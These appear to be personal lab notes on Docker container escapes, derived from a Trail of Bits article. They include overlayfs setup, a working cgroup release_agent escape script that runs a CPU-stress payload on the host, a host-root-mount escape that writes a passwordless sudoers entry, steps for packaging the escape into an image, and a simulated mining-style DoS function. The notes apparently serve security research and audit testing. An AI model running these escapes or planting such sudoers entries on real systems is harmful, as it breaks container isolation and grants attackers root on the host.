# Derived from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/


# Review overlay file system
https://wvi.cz/diyC/images-containers/
https://www.kernel.org/doc/html/latest/filesystems/overlayfs.html
https://jvns.ca/blog/2019/11/18/how-containers-work--overlayfs/
$ mkdir upper lower merged work
$ echo "I'm from lower!" > lower/in_lower.txt
$ echo "I'm from upper!" > upper/in_upper.txt
$ # `in_both` is in both directories
$ echo "I'm from lower!" > lower/in_both.txt
$ echo "I'm from upper!" > upper/in_both.txt
$ sudo mount -t overlay overly -o lowerdir=/home/pi/tmp/lower,upperdir=/home/pi/tmp/upper,workdir=/home/pi/tmp/work /home/pi/tmp/merged


#=================================================#
# CONTAINER ESCAPE A
#=================================================#

SYNERGIA: Got mount: /tmp/cgrp: wrong fs type, bad option, bad superblock on cgroup, missing codepage or helper program, or other error.
SOLUTION: https://askubuntu.com/questions/525243/why-do-i-get-wrong-fs-type-bad-option-bad-superblock-error


# On the host
docker run --name ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash

# In the container, create escape.sh file with following

#!/bin/sh
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup_memory /tmp/cgrp
mkdir /tmp/cgrp/x
echo 1 > /tmp/cgrp/x/notify_on_release
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
echo "$host_path/cmd" > /tmp/cgrp/release_agent
cat stress.txt > /cmd
chmod a+x /cmd
sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

#=================================================#
# CONTAINER ATTACK A
#=================================================#
# In the container, create stress.txt file with following
#!/bin/bash
stress() {
  (
    pids=""
    cpus=${1:-1}
    seconds=${2:-60}
    echo loading $cpus CPUs for $seconds seconds
    trap 'for p in $pids; do kill $p; done' 0
    for ((i=0;i<cpus;i++)); do while : ; do : ; done & pids="$pids $!"; done
    sleep $seconds
  )
}
stress 2 20


#=================================================#
# CONTAINER ESCAPE B
#=================================================#
# Create container from alpine image
FROM alpine
ENV WORKDIR /privesc
RUN mkdir -p $WORKDIR
VOLUME $WORKDIR
WORKDIR $WORKDIR

# Command to build container
docker build -t priv-container .


# Command to run container, was /bin/bash
docker run --name ESCAPE_B -v /:/privesc -it priv-container /bin/sh

#=================================================#
# CONTAINER ATTACK B
#=================================================#
echo "testuser ALL=(ALL) NOPASSWD: ALL" > /privesc/etc/sudoers.d/010_testuser-nopasswd



## NB: To create the escape.sh
/privesc # echo "#!/bin/sh" > escape.sh
/privesc # echo "echo \"testuser ALL=(ALL) NOPASSWD: ALL\" > /privesc/etc/sudoers.d/010_testuser-nopasswd" >> escape.sh

## The final file should look as follows
#!/bin/sh
echo "testuser ALL=(ALL) NOPASSWD: ALL" > /privesc/etc/sudoers.d/010_testuser-nopasswd


## To execute
docker exec -it ESCAPE_B /privesc/escape.sh

#=================================================#
# FIND WHAT DEVICE IS ON WHICH DEV PORT
#=================================================#
for sysdevpath in $(find /sys/bus/usb/devices/usb*/ -name dev); do
    (
        syspath="${sysdevpath%/dev}"
        devname="$(udevadm info -q name -p $syspath)"
        [[ "$devname" == "bus/"* ]] && exit
        eval "$(udevadm info -q property --export -p $syspath)"
        [[ -z "$ID_SERIAL" ]] && exit
        echo "/dev/$devname - $ID_SERIAL"
    )
done

#=================================================#
# USEFUL DOCKER COMMANDS LIST SYSCALLS
#=================================================#
ausyscall --dump
pi@raspberry:~ $ ausyscall --dump
Using x86_64 syscall table:
0	read
1	write
2	open
3	close

#=================================================#
# USEFUL DOCKER COMMANDS TO AUTOMATE ESCAPE
# To install vim in docker, need to be privileged
# docker run --privileged --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
# then in container # apt update
#                   # apt install nano (vim hopeless)
# Be sure to add as first line to script
# #!/usr/bin/bash
# Finally create escape.sh and be sure to make executable
#                   # chmod +x escape.sh
#=================================================#
docker commit ESCAPE_A ubuntu_escape

# For some containers the keys/libsec are old and need to be updated
# https://askubuntu.com/questions/1263284/apt-update-throws-signature-error-in-ubuntu-20-04-container-on-arm
# Can also get other errors
# https://stackoverflow.com/questions/24832972/docker-apt-get-update-fails
# The one that finally corrected the problem is here
# https://stackoverflow.com/questions/24832972/docker-apt-get-update-fails
# Added to hosts /etc/default/docker the following line: DOCKER_OPTS="--ip-masq=true --dns 8.8.8.8 --dns 8.8.4.4"
# Then restarted docker: sudo service restart docker
# Then started the ubuntu container and was able to run 'apt-get update'

# Using original ubuntu, install nano, add escape.sh, then commit
docker run --privileged --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
# From within container
apt-get update
apt-get install nano
nano escape.sh
#!/usr/bin/bash
...
(save)
chmod +x escape.sh

# In another host terminal, saved current ubuntu to ubuntu_escape image
# The ubuntu_escape will have the escape.sh
docker commit ESCAPE_A ubuntu_escape
# You can now exit the ubuntu container


# Start the ubuntu_escape (do not need privileged)
docker run --name=ESCAPE_A --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu_escape bash

# Finally, from other host terminal, execute escape.sh in ubuntu_escape
docker exec -it ESCAPE_A /escape.sh

# Useful website for looking up syscall by name-description
https://linux.die.net/man/2/


# scp auditlog from Umbrella to Mac
scp pi@192.168.1.102:/storage/logs/audit/audit.log .

# Way to get container id into variable
CID=$(docker run -d ubuntu_escape)



#=================================================#
# COMMAND TO SIMULATE DOS (BITCOIN MINING) ATTACK
#=================================================#
# Usage: stress [number_of_cpus_to_load [number_of_seconds] ]
stress() {
  (
    pids=""
    cpus=${1:-1}
    seconds=${2:-60}
    echo loading $cpus CPUs for $seconds seconds
    trap 'for p in $pids; do kill $p; done' 0
    for ((i=0;i<cpus;i++)); do while : ; do : ; done & pids="$pids $!"; done
    sleep $seconds
  )
}
stress $1 $2
